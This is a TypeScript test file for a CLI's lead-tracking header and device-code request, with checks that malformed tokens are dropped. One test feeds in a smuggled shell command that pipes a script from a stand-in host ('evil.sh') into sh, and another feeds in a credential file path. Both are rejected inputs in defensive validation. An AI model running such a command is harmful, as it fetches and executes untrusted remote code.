import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hivemindLeadHeader, requestDeviceCode } from "../../src/commands/auth.js";

// The per-lead token (PLA-499) is minted by the ads-funnel page, carried in the
// pasted install command, and put into this process's environment by the
// installer — never into argv, because the CLI reads argv[0] as its command
// name. This is the last hop: without the header, the token joins an ad click to
// an install and stops there, and the install can never be joined to the account
// it produced.

describe("hivemindLeadHeader", () => {
  it("emits the header for a minted token", () => {
    const token = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: token })).toEqual({ "X-Hivemind-Lead": token });
  });

  it("trims surrounding whitespace", () => {
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "  lv1_abcdefgh  " }))
      .toEqual({ "X-Hivemind-Lead": "lv1_abcdefgh" });
  });

  it("omits the header when there is no token", () => {
    expect(hivemindLeadHeader({})).toEqual({});
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "" })).toEqual({});
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "   " })).toEqual({});
  });

  // The envelope is the same one the installer and the beacon endpoint apply.
  // Validating again here means a malformed value is dropped at the last hop
  // rather than arriving as a header nobody can join on.
  it("drops anything outside the envelope", () => {
    // Too short to be a token, and too long.
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc" })).toEqual({});
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "a".repeat(65) })).toEqual({});
    // A path would carry a username; shell metacharacters have no business in a
    // value that travelled through a pasted command line.
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "/home/alice/.npmrc" })).toEqual({});
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc;curl evil.sh|sh" })).toEqual({});
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc def" })).toEqual({});
  });

  it("accepts a shape the page has not minted yet", () => {
    // Deliberately an envelope, not `lv1_` + 32 hex: a future token format must
    // reach the backend and be counted, not vanish at the client.
    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv2-ABCdef_0123456789" }))
      .toEqual({ "X-Hivemind-Lead": "lv2-ABCdef_0123456789" });
  });
});

describe("requestDeviceCode lead header", () => {
  let mockFetch: ReturnType<typeof vi.fn>;
  let prevHome: string | undefined;
  let prevLead: string | undefined;
  let tmpHome: string;

  beforeEach(() => {
    prevHome = process.env.HOME;
    prevLead = process.env.HIVEMIND_LEAD;
    tmpHome = mkdtempSync(join(tmpdir(), "hivemind-lead-home-"));
    process.env.HOME = tmpHome;

    mockFetch = vi.fn().mockResolvedValue({
      ok: true,
      json: async () => ({
        device_code: "dc", user_code: "uc",
        verification_uri: "https://v", verification_uri_complete: "https://v?c=uc",
        expires_in: 600, interval: 5,
      }),
    });
    vi.stubGlobal("fetch", mockFetch);
  });

  afterEach(() => {
    vi.unstubAllGlobals();
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    if (prevLead === undefined) delete process.env.HIVEMIND_LEAD;
    else process.env.HIVEMIND_LEAD = prevLead;
    rmSync(tmpHome, { recursive: true, force: true });
  });

  function sentHeaders(): Record<string, string> {
    return mockFetch.mock.calls[0][1].headers as Record<string, string>;
  }

  it("puts the token on the wire when the installer set it", async () => {
    process.env.HIVEMIND_LEAD = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
    await requestDeviceCode("https://api.example.com");
    expect(sentHeaders()["X-Hivemind-Lead"]).toBe("lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
  });

  it("sends no header for an ordinary install", async () => {
    delete process.env.HIVEMIND_LEAD;
    await requestDeviceCode("https://api.example.com");
    expect(sentHeaders()).not.toHaveProperty("X-Hivemind-Lead");
  });

  // The token is per-campaign-lead and the ref is per-campaign. One person can
  // carry both, and neither may displace the other.
  it("travels alongside the affiliate ref", async () => {
    process.env.HIVEMIND_LEAD = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
    await requestDeviceCode("https://api.example.com", "mario");
    expect(sentHeaders()["X-Hivemind-Lead"]).toBe("lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
    expect(sentHeaders()["X-Hivemind-Referrer"]).toBe("mario");
  });
});
